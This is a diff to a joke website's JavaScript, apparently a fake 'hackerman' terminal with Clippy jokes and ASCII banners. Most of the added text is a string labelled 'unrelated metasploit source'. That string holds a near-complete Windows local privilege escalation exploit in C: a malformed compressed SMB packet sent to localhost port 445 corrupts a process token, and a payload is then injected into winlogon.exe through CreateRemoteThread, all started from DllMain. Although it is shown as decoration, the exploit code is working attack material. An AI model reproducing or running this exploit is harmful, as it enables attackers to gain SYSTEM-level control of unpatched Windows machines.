@@ -42,6 +42,7 @@ const denied_popup_text = "\n\n\n\n\n<font color=red>\
 
 const clippy_hello_text = "It looks like you're trying to compromise this domain, would you like me to launch hackerman.exe?";
 
+
 const hacking_startup_text_1 = "\
 > hackerman -v -o /dev/nothing -i /proc/clippy\n\
    __ _____  _______ _________  __  ______   _  __\n\
@@ -56,13 +57,42 @@ Virtualising modchip to bypass the BIOS\n\
   - Extracting (your copy of winzip will soon expire)\n\
   - Demodulating\n\
   - Open-sourcing\n\
- Reverse shell in 3 2 1 . . . [/]\n\
+ Manual input required in 3 2 1 . . . [/]\n\
  \n\
 > help -q \"How do i use hackerman.exe?\"\n\
 Play your keyboard like a piano until you're in the mainframe\n\
 Two hands required, dual keyboards optional\n";
 
-const hacking_main_text = "\
+
+const access_granted_popup_text = "\n\n\n\n\n\n\
+     █████╗  ██████╗ ██████╗███████╗███████╗███████╗        \n\
+    ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝        \n\
+    ███████║██║     ██║     █████╗  ███████╗███████╗        \n\
+    ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║        \n\
+    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║        \n\
+    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝        \n\
+                                                            \n\
+ ██████╗ ██████╗  █████╗ ███╗   ██╗████████╗███████╗██████╗ \n\
+██╔════╝ ██╔══██╗██╔══██╗████╗  ██║╚══██╔══╝██╔════╝██╔══██╗\n\
+██║  ███╗██████╔╝███████║██╔██╗ ██║   ██║   █████╗  ██║  ██║\n\
+██║   ██║██╔══██╗██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██║  ██║\n\
+╚██████╔╝██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██████╔╝\n\
+ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═════╝ \n\n\
+                     Welcome: Josef                         \n";
+
+
+const homepage_header_text = "\n\
+     ██╗ ██████╗ ███████╗███████╗███████╗██████╗ ███████╗ █████╗ ███╗   ██╗\n\
+     ██║██╔═══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝██╔══██╗████╗  ██║\n\
+     ██║██║   ██║███████╗█████╗  █████╗  ██║  ██║█████╗  ███████║██╔██╗ ██║\n\
+██   ██║██║   ██║╚════██║██╔══╝  ██╔══╝  ██║  ██║██╔══╝  ██╔══██║██║╚██╗██║\n\
+╚█████╔╝╚██████╔╝███████║███████╗██║     ██████╔╝███████╗██║  ██║██║ ╚████║\n\
+       ╚════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝.co.uk\n\n\
+SITEMAP\n\
+Use Number Keys\n";
+
+
+var hacking_main_text = "\
 > /bin/secret/backdoor.dll -run\n\
   Launch failed - user error\n\
 > /bin/secret/backdoor.dll -run -please\n\
@@ -97,7 +127,264 @@ Rootkit failure: too many firewalls!\n\
      return RUN\n\
   }\n\
  > Compiling exploit...\n\
-This website is still under construction, there is no more content :(";
+ > Printing unrelated metasploit source to pass the time:\n\
+ ULONG64 get_handle_addr(HANDLE h) {\n\
+	ULONG len = 20;\n\
+	NTSTATUS status = (NTSTATUS)0xc0000004;\n\
+	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;\n\
+	HMODULE ntdll = GetModuleHandle(\"ntdll.dll\");\n\
+	if (ntdll == NULL) {\n\
+		return 0;\n\
+	}\n\
+	fpNtQuerySystemInformation NtQuerySystemInformation = \n\
+	    (fpNtQuerySystemInformation)GetProcAddress(ntdll, \"NtQuerySystemInformation\");\n\
+	if (NtQuerySystemInformation == NULL) {\n\
+		return 0;\n\
+	}\n\
+	do {\n\
+		len *= 2;\n\
+		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);\n\
+		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);\n\
+	} while (status == (NTSTATUS)0xc0000004);\n\
+	if (status != (NTSTATUS)0x0) {\n\
+		return 0;\n\
+	}\n\
+\n\
+	DWORD mypid = GetProcessId(GetCurrentProcess());\n\
+	ULONG64 ptrs[1000] = { 0 };\n\
+	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {\n\
+		PVOID object = pHandleInfo->Handles[i].Object;\n\
+		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;\n\
+		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;\n\
+\n\
+		if (pid != mypid)\n\
+			continue;\n\
+		if (handle == (ULONG_PTR)h)\n\
+			return (ULONG64)object;\n\
+	}\n\
+	return 0;\n\
+}\n\
+\n\
+ULONG64 get_process_token() {\n\
+	HANDLE token;\n\
+	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());\n\
+	if (proc == INVALID_HANDLE_VALUE)\n\
+		return 0;\n\
+	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);\n\
+	return get_handle_addr(token);\n\
+}\n\
+int error_exit(SOCKET sock) {\n\
+	WSACleanup();\n\
+	return EXIT_FAILURE;\n\
+}\n\
+int send_negotiation(SOCKET sock) {\n\
+	int err = 0;\n\
+	char response[8] = { 0 };\n\
+\n\
+	const uint8_t buf[] = {\n\
+		/* NetBIOS Wrapper */\n\
+		0x00,                   /* session */\n\
+		0x00, 0x00, 0xC4,       /* length */\n\
+		/* Preauth context */\n\
+		0x01, 0x00,             /* type */\n\
+		0x26, 0x00,             /* length */\n\
+		0x00, 0x00, 0x00, 0x00, /* reserved */\n\
+		0x01, 0x00,             /* hash algorithm count */\n\
+		0x20, 0x00,             /* salt length */\n\
+		0x01, 0x00,             /* hash algorith, SHA512 */\n\
+		0x00, 0x00, 0x00, 0x00, /* salt */\n\
+		0x00, 0x00, 0x00, 0x00,\n\
+		0x00, 0x00,             /* pad */\n\
+		/* Compression context */\n\
+		0x03, 0x00,             /* type */\n\
+		0x0E, 0x00,             /* length */\n\
+		0x00, 0x00, 0x00, 0x00, /* reserved */\n\
+		0x02, 0x00,             /* compression algorithm count */\n\
+		0x00, 0x00,             /* padding */\n\
+		0x01, 0x00, 0x00, 0x00, /* flags */\n\
+		0x02, 0x00,             /* LZ77 */\n\
+		0x03, 0x00,             /* LZ77+Huffman */\n\
+		0x00, 0x00, 0x00, 0x00, /* padding */\n\
+		0x00, 0x00, 0x00, 0x00\n\
+	};\n\
+	if ((err = send(sock, (const char*)buf, sizeof(buf), 0)) != SOCKET_ERROR) {\n\
+		recv(sock, response, sizeof(response), 0);\n\
+	}\n\
+	return err;\n\
+}\n\
+\n\
+int send_compressed(SOCKET sock, unsigned char* buffer, ULONG len) {\n\
+	int err = 0;\n\
+	char response[8] = { 0 };\n\
+\n\
+	const uint8_t buf[] = {\n\
+		0xFC, 0x53, 0x4D, 0x42, /* protocol id */\n\
+		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */\n\
+	};\n\
+	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + 0x10 + len);\n\
+	if (packet == NULL) {\n\
+		return error_exit(sock);\n\
+	}\n\
+	memcpy(packet, buf, sizeof(buf));\n\
+	*(uint64_t*)(packet + sizeof(buf)) = 0x1FF2FFFFBC;\n\
+	*(uint64_t*)(packet + sizeof(buf) + 0x8) = 0x1FF2FFFFBC;\n\
+	memcpy(packet + sizeof(buf) + 0x10, buffer, len);\n\
+\n\
+	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x10 + len, 0)) != SOCKET_ERROR) {\n\
+		recv(sock, response, sizeof(response), 0);\n\
+	}\n\
+	free(packet);\n\
+	return err;\n\
+}\n\
+\n\
+void inject(PMSF_PAYLOAD pMsfPayload) {\n\
+	PROCESSENTRY32 entry;\n\
+	entry.dwSize = sizeof(PROCESSENTRY32);\n\
+\n\
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\
+	int pid = -1;\n\
+	if (Process32First(snapshot, &entry) == TRUE) {\n\
+		while (Process32Next(snapshot, &entry) == TRUE) {\n\
+			if (lstrcmpiA(entry.szExeFile, \"winlogon.exe\") == 0) {\n\
+				pid = entry.th32ProcessID;\n\
+				break;\n\
+			}\n\
+		}\n\
+	}\n\
+	CloseHandle(snapshot);\n\
+	if (pid < 0) {\n\
+		return;\n\
+	}\n\
+	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n\
+	if (hProc == NULL) {\n\
+		return;\n\
+	}\n\
+	LPVOID lpMem = VirtualAllocEx(hProc, NULL, pMsfPayload->dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\
+	if (lpMem == NULL) {\n\
+		return;\n\
+	}\n\
+	if (!WriteProcessMemory(hProc, lpMem, &pMsfPayload->cPayloadData, pMsfPayload->dwSize, 0)) {\n\
+		return;\n\
+	}\n\
+	if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {\n\
+		return;\n\
+	}\n\
+}\n\
+\n\
+DWORD exploit(PMSF_PAYLOAD pMsfPayload) {\n\
+	WORD wVersionRequested = MAKEWORD(2, 2);\n\
+	WSADATA wsaData = { 0 };\n\
+	SOCKET sock = INVALID_SOCKET;\n\
+	uint64_t ktoken = 0;\n\
+	int err = 0;\n\
+	if ((err = WSAStartup(wVersionRequested, &wsaData)) != 0) {\n\
+		return EXIT_FAILURE;\n\
+	}\n\
+	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {\n\
+		WSACleanup();\n\
+		return EXIT_FAILURE;\n\
+	}\n\
+	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\
+	if (sock == INVALID_SOCKET) {\n\
+		WSACleanup();\n\
+		return EXIT_FAILURE;\n\
+	}\n\
+	SOCKADDR_IN client;\n\
+	client.sin_family = AF_INET;\n\
+	client.sin_port = htons(445);\n\
+	InetPton(AF_INET, \"127.0.0.1\", &client.sin_addr);\n\
+\n\
+	if (connect(sock, (SOCKADDR*)&client, sizeof(client)) == SOCKET_ERROR) {\n\
+		return error_exit(sock);\n\
+	}\n\
+	if (send_negotiation(sock) == SOCKET_ERROR) {\n\
+		return error_exit(sock);\n\
+	}\n\
+	ULONG buffer_size = 0x1110;\n\
+	UCHAR* buffer = (UCHAR*)malloc(buffer_size);\n\
+	if (buffer == NULL) {\n\
+		return error_exit(sock);\n\
+	}\n\
+\n\
+	ktoken = get_process_token();\n\
+	if (ktoken == 0) {\n\
+		return EXIT_FAILURE;\n\
+	}\n\
+\n\
+	HMODULE ntdll = GetModuleHandle(\"ntdll.dll\");\n\
+	if (ntdll == NULL) {\n\
+		return EXIT_FAILURE;\n\
+	}\n\
+	fpRtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize = \n\
+	    (fpRtlGetCompressionWorkSpaceSize)GetProcAddress(ntdll, \"RtlGetCompressionWorkSpaceSize\");\n\
+	if (RtlGetCompressionWorkSpaceSize == NULL) {\n\
+		return EXIT_FAILURE;\n\
+	}\n\
+	fpRtlCompressBuffer RtlCompressBuffer = (fpRtlCompressBuffer)GetProcAddress(ntdll, \"RtlCompressBuffer\");\n\
+	if (RtlCompressBuffer == NULL) {\n\
+		return EXIT_FAILURE;\n\
+	}\n\
+\n\
+	memset(buffer, 'A', 0x1108);\n\
+	*(uint64_t*)(buffer + 0x1108) = ktoken + 0x40; /* where we want to write */\n\
+\n\
+	ULONG CompressBufferWorkSpaceSize = 0;\n\
+	ULONG CompressFragmentWorkSpaceSize = 0;\n\
+	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS,\n\
+		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);\n\
+\n\
+	if (err != STATUS_SUCCESS) {\n\
+		return error_exit(sock);\n\
+	}\n\
+\n\
+	ULONG FinalCompressedSize;\n\
+	UCHAR compressed_buffer[64];\n\
+	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);\n\
+	if (lpWorkSpace == NULL) {\n\
+		return error_exit(sock);\n\
+	}\n\
+\n\
+	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size,\n\
+		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);\n\
+\n\
+	if (err != STATUS_SUCCESS) {\n\
+		free(lpWorkSpace);\n\
+		return error_exit(sock);\n\
+	}\n\
+\n\
+	if (send_compressed(sock, compressed_buffer, FinalCompressedSize) == SOCKET_ERROR) {\n\
+		return error_exit(sock);\n\
+	}\n\
+\n\
+	inject(pMsfPayload);\n\
+\n\
+	WSACleanup();\n\
+	return EXIT_SUCCESS;\n\
+}\n\
+\n\
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)\n\
+{\n\
+	BOOL bReturnValue = TRUE;\n\
+	switch (dwReason)\n\
+	{\n\
+	case DLL_QUERY_HMODULE:\n\
+		hAppInstance = hinstDLL;\n\
+		if (lpReserved != NULL)\n\
+		{\n\
+			*(HMODULE*)lpReserved = hAppInstance;\n\
+		}\n\
+		break;\n\
+	case DLL_PROCESS_ATTACH:\n\
+		hAppInstance = hinstDLL;\n\
+		exploit((PMSF_PAYLOAD)lpReserved);\n\
+		break;\n\
+	case DLL_PROCESS_DETACH:\n\
+	case DLL_THREAD_ATTACH:\n\
+	case DLL_THREAD_DETACH:\n\
+		break;\n\
+	}\n\
+	return bReturnValue;\n\
+}\n";
 
 
 const hacking_verbs = [
